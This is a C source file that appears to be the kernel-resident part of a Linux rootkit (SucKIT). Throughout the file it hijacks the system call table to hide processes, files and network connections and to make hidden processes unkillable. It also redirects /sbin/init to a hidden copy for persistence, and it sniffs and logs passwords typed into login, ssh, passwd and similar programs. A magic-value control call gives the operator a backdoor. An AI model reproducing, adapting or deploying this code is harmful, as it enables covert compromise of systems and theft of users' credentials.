/*
 * $Id: kernel.c, ONLY THIS WILL GET RESIDENT IN KERNEL!,
 *	IMPORTANT: If you will be hacking this, DO NOT USE
 *	static/global variables (local/auto is ok), because they will not
 *	get relocated, use DVAR/DSTR/DARR self-relocating variables
 *	instead. -sd
 */

#include "stuff.h"

/*
 * Variables
 */
DVAR(pid_struc *, pidtab, NULL);
DVAR(ulong, oldsct, 0);
DVAR(uchar, pidhiding, 1);
DVAR(uchar, filehiding, 1);
DARR(ulong *, 2, oldsctp);
DARR(int, BAD_COUNT, netlist, -1);	/* list of "bad" tcp files */
DVAR(int, commhack, 0);
DSTR(devnull, "/dev/null");
DSTR(suckver, VERSION);
DSTR(hidestr, HIDESTR);
DSTR(sniffdir, HOME "/" SKTTYLOG);
DSTR(sproc, "/proc/");
DSTR(snet, "/proc/net/");
DSTR(ssocket, "socket:[");
#ifdef INITSTUFF
DSTR(sinit, "/sbin/init");
DSTR(hinit, "/sbin/init" HIDESTR);
#endif

#define SBINLEN 6

#ifdef SNIFFER
/* services where we should start tty sniffer */
DSTR(sniffser, "login\0ssh\0ftp\0telnet\0rsh\0scp\0rcp\0rlogin\0rexec\0passwd\0adduser\0mysql\0");
/* where we should stop sniffing -- after entering password ;) */
DSTR(ssword, "ssword:");
#endif

/*
 * Some strange defs
 */
#define LS(a,b,c,d) (a+(b<<8)+(c<<16)+(d<<24))

/* printk() debug stuff,
   place the *your* value of printk from /proc/ksyms */
#define crd(fmt,args...) \
{ int (*printk) (char *, ...) = (void *) 0xc0115fa0; \
DSTR(fstr, __FUNCTION__ "():" fmt "\n"); \
printk(fstr(), args); }

#define	hook(name)	\
	newsct[__NR_##name] = ((ulong) new_##name -	\
			      (ulong) kernel_start) +	\
			      (ulong) mem + SCT_TABSIZE;
#define	new(type, name, args...) \
	type new_##name (args)
extern	int old(const ulong nr, ...);
#define SYS(name, args...) \
	old(__NR_##name * 4, args); asm("pushl %eax\n");

#define	IS_HIDDEN(x) (((x)->net) == (void *) 0xffffffff)
#define	IS_SNIFFING(x) (((x)->net) == (void *) 0xfffffffe)
#define IS_PASSWORD(x) (((x)->net) == (void *) 0xfffffffd)
#define CHECK_NET(x) ((ulong) (x) < 0xfffffffd)
#define IS_NET(x) ((ulong) ((x)->net) < 0xfffffffd)
#define	SET_HIDDEN(x) (x)->net = (void *) 0xffffffff
#define SET_SNIFFING(x) (x)->net = (void *) 0xfffffffe
#define SET_PASSWORD(x) (x)->net = (void *) 0xfffffffd
#define	UNSET_HIDDEN(x) (x)->net = NULL;

/* poor! */
asm (
	".globl	kernel_start\n\t"
	".globl	kernel_end\n\t"
	".globl	old80\n\t"
	"old:\n\t"
	"	pop	%eax\n\t"	/* pop return addr */
	"	xchg	(%esp), %eax\n\t" /* exchange with syscall # */
	"	push	%eax\n\t"	/* for adding */
	"	call	f_oldsct\n\t"	/* get ptr to addr of syscalltab */
	"	mov	(%eax), %eax\n\t" /* load addr of sct[] */
	"	add	%eax, (%esp)\n\t" /* add to number in eax */
	"	pop	%eax\n\t"	/* in eax entry of sct[] */
	"	jmp	*(%eax)\n\t");	/* execute that sucker */

/****************************** FUNCTIONS ****************************/
/* check whether it's /sbin/init that should be stealthed */
#ifdef INITSTUFF
int	its_init(int fd)
{
	ulong	limit = current()->limit;
	int	i, ret = 0;
	struct	stat st;
	struct	stat fl;

	current()->limit = KERNEL_DS;

	i = SYS(access, hinit(), F_OK);
	if (i < 0)
		goto outta;

	i = SYS(fstat, fd, &fl);
	if (i < 0)
		goto outta;

	i = SYS(stat, sinit(), &st);
	if (i < 0)
		goto outta;

	if ((st.st_ino == fl.st_ino) &&
	    (st.st_dev == fl.st_dev) &&
	    (st.st_size == fl.st_size)) ret++;
outta:
	current()->limit = limit;
	return ret;
}

int	is_init(char *fn)
{
	ulong	limit = current()->limit;
	int	i, ret = 0;
	struct	stat st;
	struct	stat fl;

	current()->limit = KERNEL_DS;

	i = SYS(access, hinit(), F_OK);
	if (i < 0)
		goto outta;

	i = SYS(stat, fn, &fl);
	if (i < 0)
		goto outta;

	i = SYS(stat, sinit(), &st);
	if (i < 0)
		goto outta;

	if ((st.st_ino == fl.st_ino) &&
	    (st.st_dev == fl.st_dev) &&
	    (st.st_size == fl.st_size)) ret++;
outta:
	current()->limit = limit;
	return ret;
}
#endif

/* number => string */
int	my_itoa(uchar *buf, uint n)
{
	uint	nl = 0;
	uint	d = 1000000000;
	uchar	*p = buf;

	if (!n) {
		*p++ = '0';
		goto out;
	}

	while (d) {
		uchar c;
		c = n / d;
		n = n % d;
		if (!c) {
			if (nl) *p++ = '0';
		} else {
			nl = 1;
			*p++ = c + '0';
		}
		d = d / 10;
	}
out:
	*p = 0;
	return ((ulong) p) - ((ulong) buf);
}


/* string -> number */
uint    my_atoi(char *n)
{
        register uint ret = 0;
        while ((((*n) < '0') || ((*n) > '9')) && (*n))
                n++;
        while ((*n) >= '0' && (*n) <= '9')
                ret = ret * 10 + (*n++) - '0';
        return ret;
}


/* scan memory block for string of bytes */
void * my_memmem(char *s1, int l1, char *s2, int l2)
{
        if (!l2) return s1;
        while (l1 >= l2) {
                l1--;
                if (!memcmp(s1,s2,l2))
                        return s1;
                s1++;
        }
        return NULL;
}


/* this will check whether supplied fd is a tty */
int	is_a_tty(int fd)
{
	ulong	limit, t;
	int	i;

	limit = current()->limit;
	current()->limit = KERNEL_DS;
	i = SYS(ioctl, fd, TIOCGPGRP, &t);
	current()->limit = limit;
	return (!(i < 0));
}

/* allocate some user-space memory */
void	*ualloc(ulong size)
{
	struct	mmap mm;
	void	*res;
	ulong	limit;

	/* just to fool some strange is-this-really-user
	   memory checks */
	limit = current()->limit;
	current()->limit = KERNEL_DS;

	mm.addr = 0;
	mm.len = ALIGN4K(size);
	mm.prot = PROT_RWX;
	mm.flags = MAP_PRIVATE;
	mm.fd = 0;
	mm.offset = 0;
	res = (void *) SYS(mmap, &mm);

	current()->limit = limit;

	if (ERR(res))
		return NULL;
	return res;
}

/* free some user-space memory */
void	ufree(void *mem, ulong size)
{
	if (mem) { SYS(munmap, mem, ALIGN4K(size)) };
}

/* check whether pid exists, 1 == true */
int	check_pid(int pid)
{
	int	r;

	r = SYS(kill, pid, 0);
	return (r != -ESRCH);
}

/* add one pid to the table, if already exists
   just return pointer to it */
pid_struc *add_pid(int pid)
{
	pid_struc *l = NULL, *p = *pidtab();
	int	i;

	if (!check_pid(pid)) return NULL;

	for (i = PID_CNT; i; i--, p++) {
		if ((p->pid) && (!check_pid(p->pid)))
			p->pid = 0;

		if (p->pid == pid)
			return p;
		
		if (!p->pid)
			l = p;
	}

	if (l) {
		l->net = NULL;
		l->pid = pid;
	}
	return l;
}

/* same as add_pid, but it will not create new
   one when does not exists (=NULL) */
pid_struc *find_pid(int pid)
{
	pid_struc *p = *pidtab();
	int	i;

	if (!check_pid(pid)) return NULL;

	for (i = PID_CNT; i; i--, p++) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

/* returns pid struc of current pid */
pid_struc *curr()
{
	int	p;
	p = SYS(getpid, 0);
	return add_pid(p);
}

/* check whether given file & inode should be hidden */
int	is_hidden(char *name, ulong ino)
{
	uchar	*h = hidestr();

	if (*filehiding()) {
		register int l = strlen(name);
		if ((l >= sizeof(HIDESTR)-1) &&
		    (!strcmp(h, &name[l-(sizeof(HIDESTR)-1)])))
		    	return 1;
	}
	if (*pidhiding()) {
		ulong	c = 0;
		pid_struc *p;
		char	*b = name;

		while (*b) {
			if ((*b == '/') && (*(b + 1) != 0)) name = b + 1;
			b++;
		}

	        while (*name) {
	                if ((*name < '0') || (*name > '9'))
	                        break;
	                c = c * 10 + (*name++) - '0';
		}
	        if (((ino - 2) / 65536) != c) return 0;
       		p = find_pid(c);
		if ((p) && (IS_HIDDEN(p)))
			return 1;
	}
	return 0;
}

/* make some pid invisible */
int	hide_pid(int pid)
{
	pid_struc	*p = add_pid(pid);

	if (!p) return 0;
	SET_HIDDEN(p);
	return 1;
}

/* make some pid visible */
int	unhide_pid(int pid)
{
	pid_struc	*p = find_pid(pid);

	if (!p) return 0;
	UNSET_HIDDEN(p);
	return 1;
}

/* sniffer logger */
#ifdef SNIFFER
void	snifflog(void *p, int length)
{
	int	fd;
	int	l;
	ulong	limit;

	l = SYS(umask, 0);
	limit = current()->limit;
	current()->limit = KERNEL_DS;
	fd = SYS(open, sniffdir(), O_APPEND | O_WRONLY | O_CREAT, 0222);
	SYS(umask, l);
	if (fd < 0) goto outta;

	l = SYS(write, fd, p, length);
	SYS(close, fd);
outta:
	current()->limit = limit;
}
#endif

static inline int     invisible_socket(int nr, int *tab, int max)
{
        int     i;
        for (i = 0; i < max; i++) {
                if (tab[i] == nr)
                        return 1;
        }
        return 0;
}

/* ehrm. ehrm. 8 gotos at one page of code ? uglyneees ;)
   this is code strips (i hope ;) "bad" things from netstat, etc. */
int     strip_net(char *src, char *dest, int size, int *net_tab,
                  int ncount)
{
        char   *ptr = src;
        char   *bline = src;
        int     temp;
        int     ret = 0;
        int     i;

rnext:
        if (ptr >= (src + size))
                goto rlast;
        if ((ptr - bline) > 0) {
                memcpy(dest, bline, ptr - bline);
                dest += ptr - bline;
                ret += ptr - bline;
        }
        bline = ptr;
        for (i = 0; i < 9; i++) {
                while (*ptr == ' ') {
                        if (ptr >= (src + size))
                                goto rlast;
                        if (*ptr == '\n')
                                goto rnext;
                        ptr++;
                }
                while (*ptr != ' ') {
                        if (ptr >= (src + size))
                                goto rlast;
                        if (*ptr == '\n')
                                goto rnext;
                        ptr++;
                }
                if (ptr >= (src + size))
                        goto rlast;
        }
        temp = my_atoi(ptr);
        while (*ptr != '\n') {
                ptr++;
                if (ptr >= (src + size))
                        goto rlast;
        }
        ptr++;
        if (invisible_socket(temp, net_tab, ncount))
                bline = ptr;
        goto rnext;
rlast:
        if ((ptr - bline) > 0) {
                memcpy(dest, bline, ptr - bline);
                ret += ptr - bline;
        }
        return ret;
}


/* this creates table ("cache") of sockets owned by invisible processes */
/* sorry for the weird code ... but try it with that limited set of
   functions ;) */
int     create_net_tab(int *tab, int max)
{
	pid_struc *p = *pidtab();

	uchar	*ssock = ssocket();
	uchar	*sp = sproc();
	int	pl = strlen(sp);
	ulong	sfd = LS('/', 'f', 'd', 0);

	int	i, j;
	int	fd;
	uchar	buf[32];
	uchar	buf2[32];
	struct	de de;
	int	cnt = 0;
	ulong	limit = current()->limit;
	
	current()->limit = KERNEL_DS;

	for (i = 0; i < PID_CNT; i++) {
		if (p[i].pid && IS_HIDDEN(&p[i])) {
		uchar *zptr;

		strcpy(buf, sp);
		zptr = buf + pl + my_itoa(buf + pl, p[i].pid);
		strcpy(zptr, (uchar *) &sfd); zptr += 3;
		fd = SYS(open, buf, O_RDONLY, 0);
		if (fd < 0) continue;
		*zptr++ = '/';
		loopcont:
			j = SYS(readdir, fd, &de, sizeof(struct de));
			if (j != 1) goto loopout;
			strcpy(zptr, de.d_name);
			j = SYS(readlink, buf, buf2, sizeof(buf2));
			if (j > 0) {
				buf2[j] = 0;
				if (!strncmp(buf2, ssock, 8)) {
					tab[cnt++] = my_atoi(buf2);
					if (cnt >= max) {
						SYS(close, fd);
						goto outta;
					}
				} /* strncmp */
			} /* readlink */
			goto loopcont;
		loopout:
		SYS(close, fd);
		} /* IS_HIDDEN */
	} /* for */
outta:
	current()->limit = limit;
	return cnt;
}


/* destroy net struct */
void	destroy_net_struc(net_struc **net) {
	if ((net) && (*net) && (CHECK_NET(*net))) {
		ufree(*net, (*net)->data_len + sizeof(net_struc));
		*net = NULL;
	}
}

/* creates net struct -- all only for filtering out our
   own network entries */
#define	NT_SIZE	4096	/* max. number of entries in cache */
#define	NT_MEM  NT_SIZE*sizeof(int)
net_struc *create_net_struc(int fd)
{
	int		size = 0;
	net_struc	*ns = NULL;
	uchar		*tmp = NULL;
	
	int		*net_tab;
	int		ncount;
	int		nsize;
	int		i;

	/* allocate temp buffer */
	net_tab = ualloc(NT_MEM);
	if (!net_tab) return NULL;

	do {
		nsize = SYS(read, fd, net_tab, NT_MEM);
		if (nsize < 0)
			goto errfree;
		size += nsize;
	} while (nsize == NT_MEM);

	i = SYS(lseek, fd, 0, 0);
	if (i != 0) goto errfree;
	tmp = ualloc(size);
	if (!tmp) goto errfree;
	ns = ualloc(sizeof(net_struc) + size);
	if (!ns) goto tmpfree;
	ncount = create_net_tab(net_tab, NT_SIZE);
	if (!ncount) goto nsfree;
        nsize = SYS(read, fd, tmp, size);
	if (nsize < 0) goto nsfree;
	SYS(lseek, fd, 0, 0);
	ns->data_len = size;
	ns->len = strip_net(tmp, ns->data, nsize, net_tab, ncount);
	ns->pos = 0;
	ns->fd = fd;
	goto tmpfree;

nsfree:
	ufree(ns, sizeof(net_struc) + size);
	ns = NULL;
tmpfree:
	ufree(tmp, size);
errfree:
	ufree(net_tab, NT_MEM);
	return ns;
}

int	fill_netlist(char *base, char *b, ulong serv, int *p)
{
	int	i;
	struct	stat st;

	*((ulong *) b) = serv;
	i = SYS(stat, base, &st);
	if (i < 0) return -1;
	*p = st.st_ino;
	return st.st_dev;
}

void	create_nl(int *nl)
{
	char	buf[32];
	char	*ep;

	strcpy(buf, snet());
	ep = buf + strlen(buf);
	nl[0] = fill_netlist(buf, ep, LS('t', 'c', 'p', 0), &nl[1]);
	if (nl[0] == -1)
		return;
	fill_netlist(buf, ep, LS('u', 'd', 'p', 0), &nl[2]);
	fill_netlist(buf, ep, LS('r', 'a', 'w', 0), &nl[3]);
}

/* this will catch "bad" files, returns 1 if something went wrong */
void	catch_net(char *path, int fd)
{
	ulong	limit;
	int	i;
	int	*nl = netlist();
	struct	stat st;

	limit = current()->limit;
	current()->limit = KERNEL_DS;
	if (nl[0] == -1) create_nl(nl);
	i = SYS(fstat, fd, &st);
	if (i < 0) goto outta;
	if (st.st_dev != nl[0])
		goto outta;
	for (i = 1; i < 4; i++) {
		if (st.st_ino == nl[i]) {
			pid_struc *p = curr();
			if (!p) break;
			if (IS_HIDDEN(p)) break;
			destroy_net_struc(&p->net);
			p->net = create_net_struc(fd);
			if (!p->net) break;
			current()->flags |= PF_NET;
			break;
		}
	}
outta:
	current()->limit = limit;
	return;
}

/****************************** SYSCALLS ****************************/
/* this is main communication hook */
ulong	new_OURCALL(sk_io *buf)
{
	int	d;
	if ((buf->magic1 != MAGIC1) || (buf->magic2 != MAGIC2)) {
		d = SYS(OURCALL, buf);
		return d;
	}

	buf->ret = 0;
	switch (buf->cmd) {
		case 0:
			buf->ret = HEXVER;
			strcpy(buf->buf, suckver());
			break;	
			
		case CMD_UNINSTALL: {
			ulong	**l = oldsctp();
			ulong	t = *oldsct();
			*(l[0]) = t;
			*(l[1]) = t;
			break;
		}
		case CMD_HIDEPID:
			if (hide_pid(buf->arg))
				break;
			return -1;
		case CMD_UNHIDEPID:
			if (unhide_pid(buf->arg)) 
				break;
			return -1;
		case CMD_PIDHIDING:
		case CMD_FILEHIDING: {
			uchar	*f =
			(buf->cmd==CMD_PIDHIDING)?pidhiding():filehiding();
			if (buf->arg < 2) {
				*f = buf->arg;
			} else {
				*f ^= 1;
			}
			buf->ret = *f;
			break;
		}
		case CMD_COMMHACK:
			*commhack() = 1;
			break;
		default:
			buf->ret = -1;
			return -1;
			break;
	}
	return MAGIC1;
}

/* fork() hooks */
int	new_clone(struct pt_regs regs)
{
	pid_struc	*parent;
	int		pid;

	parent = curr();

	pid = SYS(clone, regs);
	if (pid > 0) {
		if ((parent) && (IS_HIDDEN(parent))) {
			pid_struc *n;
			n = add_pid(pid);
			if (n) {
				SET_HIDDEN(n);
				current()->flags &= ~PF_MASK;
			}
		}
	}
	return pid;
}
int	new_fork(struct pt_regs regs)
{
	pid_struc	*parent;
	int		pid;
	
	parent = curr();
	pid = SYS(fork, regs);
	if (pid > 0) {
		if ((parent) && (IS_HIDDEN(parent))) {
			pid_struc *n;
			n = add_pid(pid);
			if (n) {
				SET_HIDDEN(n);
				current()->flags &= ~PF_MASK;
			}
		}
	}
	return pid;
}

int	new_vfork(struct pt_regs regs)
{
	pid_struc	*parent;
	int		pid;
	
	parent = curr();
	pid = SYS(vfork, regs);
	if (pid > 0) {
		if ((parent) && (IS_HIDDEN(parent))) {
			pid_struc *n;
			n = add_pid(pid);
			if (n) {
				SET_HIDDEN(n);
				current()->flags &= ~PF_MASK;
			}
		}
	}
	return pid;
}

/* this is a bit experimental code, time will show ... */
int	new_getdents(int fd, struct de *dirp, int count)
{
	int		oldlen, len;
	uchar		*cpy, *dest;
	uchar		*p = (uchar *) dirp;
	pid_struc	*pi;
	

	if (count <= 0) return -EINVAL;

	len = oldlen = SYS(getdents, fd, dirp, count);
	if (oldlen <= 0)
		return oldlen;

	pi = curr();
	if ((pi) && (IS_HIDDEN(pi)))
		return oldlen;

	dest = cpy = ualloc(oldlen);
	if (!cpy) return oldlen;
#define dp ((struct de *) p)
	while (len > 0) {
		if (!is_hidden(dp->d_name, dp->d_ino)) {
			memcpy(dest, p, dp->d_reclen);
			dest += dp->d_reclen;
		}
		len -= dp->d_reclen;
		p += dp->d_reclen;
	}
#undef dp
	memcpy(dirp, cpy, dest - cpy);
	ufree(cpy, oldlen);
	len = new_getdents(fd, (void *) (((uchar *) dirp) + (dest - cpy)),
			   (int) (count - (dest - cpy)));
	if (len <= 0) len = 0;
	return (dest - cpy) + len;
}
int	new_getdents64(int fd, struct de64 *dirp, int count)
{
	int		oldlen, len;
	uchar		*cpy, *dest;
	uchar		*p = (uchar *) dirp;
	pid_struc	*pi;

	if (count <= 0) return -EINVAL;

	len = oldlen = SYS(getdents64, fd, dirp, count);
	if (oldlen <= 0)
		return oldlen;

	pi = curr();
	if ((pi) && (IS_HIDDEN(pi)))
		return oldlen;

	dest = cpy = ualloc(oldlen);
	if (!cpy) return oldlen;
/* filter out "bad" file entries */
#define dp ((struct de64 *) p)
	while (len > 0) {
		if (!is_hidden(dp->d_name, dp->d_ino)) {
			memcpy(dest, p, dp->d_reclen);
			dest += dp->d_reclen;
		}
		len -= dp->d_reclen;
		p += dp->d_reclen;
	}
#undef dp
	memcpy(dirp, cpy, dest - cpy);
	ufree(cpy, oldlen);
	len = new_getdents64(fd, (void *) (((uchar *) dirp) + (dest - cpy)),
			   (int) (count - (dest - cpy)));
	if (len <= 0) len = 0;
	return (dest - cpy) + len;
}


/* read() & write() hooks - sniffing the ttys */
#ifdef SNIFFER
int	new_write(int fd, void *buf, int count)
{
	int	res;

	res = SYS(write, fd, buf, count);
	if ((res > 0) &&
		((current()->flags & PF_SNIFFING) ||
		 (current()->flags & PF_PASSWORD))) {
		if (is_a_tty(fd)) {
			pid_struc	*p;
			uchar		*pwd = ssword();
			p = curr();
			if ((p) && (IS_SNIFFING(p) || IS_PASSWORD(p))) {
				snifflog(buf, count);
				if (my_memmem(buf, count, pwd,
				    strlen(pwd))) {
				    	SET_PASSWORD(p);
					current()->flags |= PF_PASSWORD;
				}
			}
		}
	}
	return res;
}

int	new_read(int fd, void *buf, int count)
{
	int	res;

	if (current()->flags & PF_NET) {
		pid_struc	*p;
		p = curr();
		if ((p) && (IS_NET(p)) && (p->net->fd == fd)) {
	                if ((count + p->net->pos) > p->net->len) {
	                        count = p->net->len - p->net->pos;
	                }
	                if ((p->net->pos >= p->net->len) ||
	                    (count == 0)) return 0;
	                memcpy(buf, p->net->data + p->net->pos, count);
	                p->net->pos += count;
	                return count;
		}
	}


	res = SYS(read, fd, buf, count);
	if (res > 0) {
		if (is_a_tty(fd)) {
			pid_struc	*p;
			p = curr();
			if ((p) && IS_PASSWORD(p)) {
				snifflog(buf, res);
				if (memchr(buf, '\n', res) ||
				    memchr(buf, '\r', res)) {
					UNSET_HIDDEN(p);
					current()->flags &= ~PF_MASK;
				}
			}
		}
	}
	return res;
}
#endif

/* special execve() wrapper - to look for stuff we could be interested in
   -- see DSTR(sniffser) */
void	execve_wrapper(int dummy, struct pt_regs regs)
{
	pid_struc	*pc = curr();
	uchar	*p, *s;
	ulong	space = 0x20; // " "
	ulong	nl = 0x0a3a;  // ":\n"
	int	i;

	uchar	**argv = ((uchar **) (regs.esp + 4));

	if (IS_HIDDEN(pc)) return;
	if (IS_NET(pc)) pc->net = NULL;

	current()->flags &= ~PF_MASK;

	i = SYS(getpid, 0);

#ifdef INITSTUFF
	/* ugly COMM hack :P */
	if ((i == 1) && (*commhack())) {
		char	*p = my_memmem((void *) current(), 4096,
			     hinit() + SBINLEN, strlen(hinit() + SBINLEN));
		*commhack() = 0;
		if (p) {
			strcpy(p, sinit() + SBINLEN);
		}
	}
#endif
#ifdef SNIFFER
	s = argv[0];
	for (p = s; *s; s++) if (*s == '/') p = s + 1;
	s = sniffser();
	while (*s) {
		int	l = strlen(s);

		if (!strncmp(p, s, l)) {
			int	i;

			SET_SNIFFING(pc);
			current()->flags |= PF_SNIFFING;
			for (i = 0; argv[i]; i++) {
				snifflog(argv[i], strlen(argv[i]));
				snifflog((uchar *) &space, 1);
			}
			snifflog((uchar *) &nl, 2);
			return;
		}
		s += l + 1;
	}
#endif
}

/* this will redirect execs of /sbin/init to /sbin/init<hidesuffix> */
void	execve_redir(char **fn)
{
#ifdef INITSTUFF
	int	ret;

	ret = is_init(*fn);
	if (ret) {
		char	*page = ualloc(64);
		if (!page) return;
		strcpy(page, hinit());
		*fn = page;
	}
#endif
}
extern	void new_execve();

/* execve is a bit more complicated, so we must play in assembly */
asm ("	new_execve:\n\t"
	"	pop	%esi\n\t"		/* return addr to esi */
	"	mov	%eax, %edi\n\t"		/* syscall # => edi */
	"	push	%esp\n\t"		/* ptr to filename */
	"	call	execve_redir\n\t"	/* exec redirection ? why not ;) */
	"	pop	%eax\n\t"		/* flush stack */
	"	call	f_oldsct\n\t"		/* get addr of old sct */
	"	mov	(%eax), %eax\n\t"	/* load it to eax */
	"	call	*(%eax, %edi, 4)\n\t"	/* call old handler */
	"	test	%eax, %eax\n\t"		/* sign => error */
	"	js	1f\n\t"			/* error => nothing for us */
	"	push	%eax\n\t"
	"	call	execve_wrapper\n\t"	/* call our wrapper */
	"	pop	%eax\n\t"
	"1:\n\t"
	"	jmp	*%esi\n\t");		/* jump to return point */

/* open() hook, catching "bad" files such as /proc/net/tcp in
   order to mark them for later filtering of our network activity */
int	new_open(char *path, int flags, int mode)
{
	int	fd;

	fd = SYS(open, path, flags, mode);
	if (fd >= 0) {
		pid_struc	*pi = curr();
		if (!((pi) && (IS_HIDDEN(pi))))
			catch_net(path, fd);
#ifdef INITSTUFF
		if (its_init(fd)) {
			ulong	limit;
			SYS(close, fd);
			limit = current()->limit;
			current()->limit = KERNEL_DS;
			fd = SYS(open, hinit(), flags, mode);
			current()->limit = limit;
		}
#endif
	}
	return fd;
}

/* cleanup net struct when necessary */
int     new_close(int fd)
{
	int	r;

	if (current()->flags & PF_NET) {
		pid_struc *p = curr();
	        if ((p) && (IS_NET(p)) && (p->net->fd == fd)) {
	                destroy_net_struc(&p->net);
			current()->flags &= ~PF_MASK;
	        }
	}
	r = SYS(close, fd);
        return r;
}

/* kill() hook -- make our pid's immortal! */
int     new_kill(int pid, int sig)
{
	pid_struc *p;
        int     t = pid;

        if (pid < -1)
                t = -pid;
        p = find_pid(t);
        if ((p) && (IS_HIDDEN(p))) {
                register int cpid;
		cpid = SYS(getpid, 0);
                if (cpid == 1) goto ok;
                p = find_pid(cpid);
                if ((p) && (IS_HIDDEN(p))) goto ok;
                return -ESRCH;
        }
ok:
	t = SYS(kill, pid, sig);
	return t;
}

/* ------- there is /sbin/init stealth hooks -- just to point
           questions to the right place, ... err ... file respectively :) ----- */
#ifdef INITSTUFF
int	new_utime(char *fn, void *buf)
{
	int	ret;

		ret = is_init(fn);
		if (ret) {
			ulong	limit = current()->limit;
			current()->limit = KERNEL_DS;
			ret = SYS(utime, hinit(), buf);
			current()->limit = limit;
			return ret;
		}
	ret = SYS(utime, fn, buf);
	return ret;
}

int	new_oldstat(char *fn, void *buf)
{
	int	ret;

		ret = is_init(fn);
		if (ret) {
			ulong	limit = current()->limit;
			current()->limit = KERNEL_DS;
			ret = SYS(oldstat, hinit(), buf);
			current()->limit = limit;
			return ret;
		}
	ret = SYS(oldstat, fn, buf);
	return ret;
}
int	new_oldlstat(char *fn, void *buf)
{
	int	ret;

		ret = is_init(fn);
		if (ret) {
			ulong	limit = current()->limit;
			current()->limit = KERNEL_DS;
			ret = SYS(oldstat, hinit(), buf);
			current()->limit = limit;
			return ret;
		}
	ret = SYS(oldlstat, fn, buf);
	return ret;
}
int	new_oldfstat(int fd, void *buf)
{
	int	ret;
	if (its_init(fd)) {
		ulong	limit = current()->limit;
		current()->limit = KERNEL_DS;
		ret = SYS(oldstat, hinit(), buf);
		current()->limit = limit;
		return ret;
	}
	ret = SYS(oldfstat, fd, buf);
	return ret;
}
int	new_stat(char *fn, void *buf)
{
	int	ret;

		ret = is_init(fn);
		if (ret) {
			ulong	limit = current()->limit;
			current()->limit = KERNEL_DS;
			ret = SYS(stat, hinit(), buf);
			current()->limit = limit;
			return ret;
		}
	ret = SYS(stat, fn, buf);
	return ret;
}
int	new_lstat(char *fn, void *buf)
{
	int	ret;

		ret = is_init(fn);
		if (ret) {
			ulong	limit = current()->limit;
			current()->limit = KERNEL_DS;
			ret = SYS(stat, hinit(), buf);
			current()->limit = limit;
			return ret;
		}
	ret = SYS(lstat, fn, buf);
	return ret;
}
int	new_fstat(int fd, void *buf)
{
	int	ret;
	if (its_init(fd)) {
		ulong	limit = current()->limit;
		current()->limit = KERNEL_DS;
		ret = SYS(stat, hinit(), buf);
		current()->limit = limit;
		return ret;
	}
	ret = SYS(fstat, fd, buf);
	return ret;
}
int	new_stat64(char *fn, void *buf)
{
	int	ret;

		ret = is_init(fn);
		if (ret) {
			ulong	limit = current()->limit;
			current()->limit = KERNEL_DS;
			ret = SYS(stat64, hinit(), buf);
			current()->limit = limit;
			return ret;
		}
	ret = SYS(stat64, fn, buf);
	return ret;
}
int	new_lstat64(char *fn, void *buf)
{
	int	ret;

		ret = is_init(fn);
		if (ret) {
			ulong	limit = current()->limit;
			current()->limit = KERNEL_DS;
			ret = SYS(stat64, hinit(), buf);
			current()->limit = limit;
			return ret;
		}
	ret = SYS(lstat64, fn, buf);
	return ret;
}
int	new_fstat64(int fd, void *buf)
{
	int	ret;
	if (its_init(fd)) {
		ulong	limit = current()->limit;
		current()->limit = KERNEL_DS;
		ret = SYS(stat64, hinit(), buf);
		current()->limit = limit;
		return ret;
	}
	ret = SYS(fstat64, fd, buf);
	return ret;
}

int	new_creat(char *fn, int mode)
{
	int	ret;
		ret = is_init(fn);
		if (ret) {
			ulong	limit = current()->limit;
			current()->limit = KERNEL_DS;
			ret = SYS(creat, hinit(), mode);
			current()->limit = limit;
			return ret;
		}
	ret = SYS(creat, fn, mode);
	return ret;
}
int	new_unlink(char *fn)
{
	int	ret;
//	crd("new_unlink(%s), fd = %d", fn, fd);
//		crd("its_init", NULL);
		ret = is_init(fn);
//		crd("sys(close, %d)", fd);
		if (ret) {
			ulong	limit = current()->limit;
			current()->limit = KERNEL_DS;
//			crd("sys(unlink, %s)", hinit());
			ret = SYS(unlink, hinit());
			current()->limit = limit;
			return 0;
		}
	ret = SYS(unlink, fn);
	return ret;
}
int	new_readlink(const char *path, char *buf, int size)
{
	int	res;

	res = SYS(readlink, path, buf, size);
	if (res > 0) {
		char	*p = hinit();
		int	pl = strlen(p);
		if ((res == pl) && (!memcmp(buf, p, res))) {
			memset(buf, 0, res);
			memcpy(buf, sinit(), strlen(sinit()));
			return strlen(sinit());
		}
	}
	return res;
}
#endif
/* initialization code (see install.c for details) */
void	kernel_init(uchar *mem, ulong *sct, ulong *sctp[2], ulong oldsys)
{
	ulong	ksize = (ulong) kernel_end - (ulong) kernel_start;
	ulong	*newsct = (void *) mem;

	sct[OURSYS] = oldsys;
	memset(mem + SCT_TABSIZE + ksize, 0, PID_TABSIZE);
	*oldsct() = (ulong) sct;
	*pidtab() = (void *) (mem + SCT_TABSIZE + ksize);
	memcpy(mem, sct, SCT_TABSIZE);

	hook(OURCALL);
	hook(clone);
	hook(fork);
	hook(vfork);
	hook(getdents);
	hook(getdents64);

	hook(kill);
	hook(open);
	hook(close);
#ifdef SNIFFER
	hook(read);
	hook(write);
#endif
#ifdef SNIFFER 
	hook(execve);
#endif
#ifdef INITSTUFF
	hook(utime);
	hook(oldstat);
	hook(oldlstat);
	hook(oldfstat);
	hook(stat);
	hook(lstat);
	hook(fstat);
	hook(stat64);
	hook(lstat64);
	hook(fstat64);
	hook(creat);
	hook(unlink); 
	hook(readlink);
#endif
	memcpy(oldsctp(), sctp, 2 * sizeof(ulong));

	*sctp[0] = (ulong) newsct;	/* normal call */
	*sctp[1] = (ulong) newsct;	/* ptraced call */
}

